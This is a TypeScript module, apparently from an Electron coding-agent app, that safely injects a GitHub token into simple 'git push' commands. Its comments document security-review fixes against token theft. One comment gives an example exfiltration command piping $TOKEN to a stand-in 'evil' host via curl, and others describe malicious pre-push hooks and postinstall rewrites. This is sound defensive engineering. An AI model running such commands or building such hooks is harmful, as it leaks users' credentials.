// src/electron/githubPushAuth.ts
import { spawn } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

export function isUnauthenticatedGithubRemote(url: string): boolean {
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return false; // SSH shorthand (git@github.com:owner/repo.git) and local paths aren't parseable URLs — neither needs this rewrite.
  }
  if (parsed.protocol !== "https:") return false;
  if (parsed.hostname !== "github.com") return false;
  if (parsed.username || parsed.password) return false; // already has embedded credentials
  return true;
}

/** Correctness audit finding (GitHub Medium #1): these flags consume a
 * SEPARATE following token as their own value (confirmed against real
 * git), not just a token starting with "-" of their own — `-o ci.skip`
 * is TWO tokens, and the old "skip anything starting with -" logic
 * misread "ci.skip" itself as the remote name, which doesn't exist,
 * silently disabling authenticated push for a push that genuinely needs
 * it. The `=` form (`--push-option=ci.skip`) is already a single token
 * starting with "-" and needs no special handling. Unlike --repo (below),
 * none of these flags' VALUES are themselves a remote/repository name —
 * the real remote name, if any, is still a later, separate token. */
const GIT_PUSH_FLAGS_WITH_UNRELATED_VALUE = new Set(["-o", "--push-option", "--receive-pack", "--exec"]);

/** Mirrors git's own default: the named remote right after "push" (skipping
 * leading flags like -u/--set-upstream), or "origin" if none is named. Good
 * enough for the common invocation shapes this feature targets — it never
 * needs to be a full git-argument parser, since a shape it doesn't
 * recognize just falls through to parseGitPushRemoteName's "origin"
 * default, which prepareGitPushCommand then verifies against the real
 * configured remote before doing anything. */
export function parseGitPushRemoteName(command: string): string {
  const afterPush = command.trim().replace(/^git\s+push\s*/, "");
  const tokens = afterPush.split(/\s+/).filter(Boolean);
  for (let i = 0; i < tokens.length; i++) {
    const token = tokens[i]!;
    // Final-review finding I5: --repo is NOT like -o/--push-option — its
    // value IS the destination repository itself (`git push --repo
    // upstream main` pushes to "upstream", same as `git push upstream
    // main`), not an unrelated value to skip past while still looking for
    // a remote name later in the command.
    if (token === "--repo") return tokens[i + 1] ?? "origin";
    if (token.startsWith("--repo=")) return token.slice("--repo=".length) || "origin";
    if (!token.startsWith("-")) return token;
    if (GIT_PUSH_FLAGS_WITH_UNRELATED_VALUE.has(token)) i++; // also skip this flag's own separate value token
  }
  return "origin";
}

const DANGEROUS_SHELL_CHARS = /[;&|`$<>(){}\n]/;

/** True only for a "simple" git push invocation — whitespace-separated
 * tokens with no shell metacharacters. Authentication is only ever
 * injected for commands that pass this check: an env-var token is visible
 * to every process a compound/shell command can spawn (e.g.
 * "git push origin main; curl evil -d $TOKEN" would see the token in its
 * own environment even though it never appears in the command's own
 * text) — so a command shaped like anything but a bare git push is never
 * a candidate for authentication at all. */
export function isSimpleGitPushCommand(command: string): boolean {
  return /^git\s+push\b/.test(command.trim()) && !DANGEROUS_SHELL_CHARS.test(command);
}

const CREDENTIAL_HELPER_SCRIPT = `!f() { echo username=x-access-token; echo \"password=$LOCALAGENT_GH_TOKEN\"; }; f`;

/**
 * Security-review finding: LOCALAGENT_GH_TOKEN lives in this invocation's
 * own process environment (see buildAuthenticatedGitPushArgv's returned
 * env) so the inline credential-helper script can read it — but ANY local
 * git hook (pre-push, post-receive via a local transport, etc.) runs in
 * that same environment and can read it too. A repo-committed hooks
 * directory wired up automatically via `core.hooksPath` (the standard
 * husky/simple-git-hooks pattern: `npm install` sets this up with zero
 * further action from the user) is a mainstream, non-exotic setup — a
 * malicious or compromised repo could ship a `pre-push` hook that reads
 * `$LOCALAGENT_GH_TOKEN` and exfiltrates it, triggered by a completely
 * innocuous-looking `git push origin main` with nothing suspicious for a
 * user to notice in the permission-approval dialog. Verified live: a
 * committed pre-push hook DOES see this exact env var during a real push.
 * Pointing core.hooksPath at a path that doesn't exist disables hook
 * lookup entirely for this one invocation (verified live: push succeeds
 * normally, hook never runs) without touching the user's real hooks
 * setup, which isn't modified — only this one authenticated argv is. A
 * fresh os.tmpdir()-based path (rather than a hardcoded "/dev/null") is
 * used so this works identically on Windows, where /dev/null isn't a
 * real path in the same way.
 *
 * Second security-review finding on this same function: an earlier
 * version built this path from `${process.pid}-${Date.now()}` without
 * actually creating it — predictable, and on a shared multi-user
 * machine an attacker who can guess or watch for that path could
 * pre-create it themselves and populate it with their OWN "pre-push"
 * script, turning "disable hooks" into "run an attacker-chosen hook
 * with the token in its environment" (CWE-377, the exact insecure-
 * temp-path class this review flagged). fs.mkdtempSync creates a real,
 * empty directory ATOMICALLY with a cryptographically-random suffix —
 * no separate check-then-create step for an attacker to race, and
 * nothing to guess. The directory is deliberately never cleaned up
 * afterward (this function has no hook into when the later spawned git
 * process exits to do that safely) — an acceptable trade-off since it
 * stays genuinely empty for its entire life, posing no risk beyond
 * trivial, harmless tmpdir clutter.
 */
function noHooksPath(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), "localagent-no-hooks-"));
}

/**
 * Builds the argv (never a shell string) that runs the original push with
 * an injected, github.com-scoped, one-shot credential helper.
 *
 * Three -c overrides, always in this order:
 * - "credential.helper=" (empty) RESETS git's helper list first. Without
 *   this, `-c credential.helper=X` only ADDS to whatever helpers are
 *   already configured (osxkeychain, `store`, `gh auth setup-git`, etc.) —
 *   which would be consulted FIRST (an unrelated cached account could
 *   silently win a push) and would have their own `approve` invoked on a
 *   successful push, permanently writing this app's token into the user's
 *   OS keychain or a plaintext store file, completely outside this app's
 *   own StorageCrypto-encrypted storage and surviving Disconnect.
 * - "credential.https://github.com.helper=<script>" is SCOPED to
 *   github.com specifically. A bare "credential.helper=<script>" (with no
 *   scope) would be offered to ANY host git needs credentials for during
 *   this one push — a submodule on another host, git-lfs, or a remote
 *   whose effective push URL differs from the one this function checked
 *   (remote.<name>.pushurl, a url.<host>.pushInsteadOf rewrite, or a URL
 *   crafted so this module's own URL parsing and git's own host-matching
 *   disagree). Scoping to the literal host git resolves for each
 *   individual credential request closes all of those at once — the
 *   helper is never even invoked for a request against a different host,
 *   regardless of how that request's URL was arrived at.
 * - "core.hooksPath=<fresh nonexistent path>" — see noHooksPath's doc
 *   comment above: the token-exposure-via-hooks fix.
 *
 * Deliberately does NOT allowlist/reject specific push flags (e.g.
 * --receive-pack, --exec, --repo) the way a stricter review might
 * suggest: --receive-pack/--exec only matter for ssh/local transports,
 * and this function is only ever reached for an HTTPS github.com remote
 * (isUnauthenticatedGithubRemote, checked by the caller before this runs)
 * — so neither is actually exploitable here. --repo IS handled, but by
 * parseGitPushRemoteName resolving it through the user's own real git
 * config (getConfiguredRemoteUrl) before any token is ever injected, not
 * by rejecting the flag outright — it can only redirect to another
 * github.com remote the user already configured locally, never an
 * arbitrary attacker-chosen host.
 *
 * Passed to a plain (non-shell) spawn — see runCommand.ts — so there is no
 * outer shell to interpret this feature's own quoting at all. That
 * matters cross-platform: Node's shell:true uses cmd.exe on Windows, which
 * does not understand POSIX single-quoting, so a shell-string version of
 * this same rewrite would silently fail every authenticated push there.
 */
export function buildAuthenticatedGitPushArgv(command: string, token: string): { argv: string[]; env: Record<string, string> } {
  const originalArgs = command.trim().split(/\s+/).slice(1); // drop the leading "git", keep "push ..."
  const argv = [
    "git",
    "-c",
    "credential.helper=",
    "-c",
    `credential.https://github.com.helper=${CREDENTIAL_HELPER_SCRIPT}`,
    "-c",
    `core.hooksPath=${noHooksPath()}`,
    ...originalArgs,
  ];
  return { argv, env: { LOCALAGENT_GH_TOKEN: token } };
}

/**
 * Security-review finding (validation-differential): `git remote get-url
 * <name>` (no --push) reports the FETCH url — a remote can have a
 * separate, different push destination via a plain `remote.<name>.pushurl`
 * (an everyday git feature, no attacker needed: read-only https fetch +
 * authenticated ssh/different push is a common setup) or via a
 * `url.<rewrite>.pushInsteadOf` rule (settable by a malicious npm
 * postinstall script — the exact same threat class already accepted for
 * the hooks fix above: no separate compromise needed beyond `npm install`
 * on an untrusted repo). Verified live: with a pushInsteadOf rule in
 * place, plain `get-url` still printed the original https://github.com
 * URL while an actual push silently went to a completely different host
 * (and transport — ssh, reviving the "--exec/--receive-pack only matter
 * over ssh, and this path is https-only" assumption the flag-allowlisting
 * decision above rests on). `--push` resolves pushurl/pushInsteadOf the
 * same way a real push would, with no network access (confirmed live) —
 * so this now validates the URL git will ACTUALLY push to, not one it
 * might not use at all. Confirmed live this doesn't change the result for
 * the common case (no pushurl/rewrite configured): --push and plain
 * get-url return the identical URL.
 */
async function getConfiguredRemoteUrl(workspaceRoot: string, remoteName: string, env: NodeJS.ProcessEnv): Promise<string | null> {
  return new Promise((resolve) => {
    const proc = spawn("git", ["remote", "get-url", "--push", remoteName], { cwd: workspaceRoot, env });
    let stdout = "";
    proc.stdout.on("data", (d) => (stdout += d.toString()));
    proc.on("close", (code) => resolve(code === 0 ? stdout.trim() : null));
    proc.on("error", () => resolve(null));
  });
}

/** True if git already has some way to authenticate to github.com without
 * this app's help — an existing credential helper (osxkeychain, `store`,
 * `gh auth setup-git`, one configured directly for this remote), checked
 * via git's own real credential resolution rather than re-implemented
 * here. GIT_TERMINAL_PROMPT=0 guarantees this never blocks waiting on an
 * interactive prompt — an unconfigured setup just answers with no
 * password line, same as it would non-interactively for any script. This
 * is what keeps an already-working setup (including the CLI entry point,
 * which never has a connected account to fall back to) behaving exactly
 * as it did before this feature existed, per the spec. */
async function hasExistingGithubCredential(workspaceRoot: string, env: NodeJS.ProcessEnv): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn("git", ["credential", "fill"], { cwd: workspaceRoot, env: { ...env, GIT_TERMINAL_PROMPT: "0" } });
    let stdout = "";
    proc.stdout.on("data", (d) => (stdout += d.toString()));
    proc.on("close", () => resolve(/^password=/m.test(stdout)));
    proc.on("error", () => resolve(false));
    proc.stdin.write("protocol=https\nhost=github.com\n\n");
    proc.stdin.end();
  });
}

export type PreparedCommand =
  | { kind: "unchanged"; command: string }
  | { kind: "authenticated"; argv: string[]; env: Record<string, string> }
  | { kind: "blocked"; reason: string };

/**
 * Decides whether a run_command invocation needs GitHub push authentication
 * injected, and produces the rewritten argv if so. Never touches anything
 * but a genuinely simple `git push` (Important: no shell metacharacters —
 * see isSimpleGitPushCommand) targeting an unauthenticated github.com HTTPS
 * remote with no credential already configured for it (Review Focus:
 * non-github remotes pass through untouched; an already-working setup is
 * never overridden). When it IS the target but no account is connected and
 * nothing else can authenticate it either, blocks with a clear, actionable
 * error rather than letting git fail confusingly on its own — the caller
 * must not spawn git at all in that case.
 */
export async function prepareGitPushCommand(
  command: string,
  workspaceRoot: string,
  getToken: () => Promise<string | null>,
  env: NodeJS.ProcessEnv = process.env
): Promise<PreparedCommand> {
  if (!isSimpleGitPushCommand(command)) return { kind: "unchanged", command };

  const remoteName = parseGitPushRemoteName(command);
  const remoteUrl = await getConfiguredRemoteUrl(workspaceRoot, remoteName, env);
  if (!remoteUrl || !isUnauthenticatedGithubRemote(remoteUrl)) return { kind: "unchanged", command };

  if (await hasExistingGithubCredential(workspaceRoot, env)) return { kind: "unchanged", command };

  const token = await getToken();
  if (!token) {
    return { kind: "blocked", reason: "This push targets GitHub, but no GitHub account is connected — connect one in Settings first." };
  }
  const { argv, env: tokenEnv } = buildAuthenticatedGitPushArgv(command, token);
  return { kind: "authenticated", argv, env: tokenEnv };
}
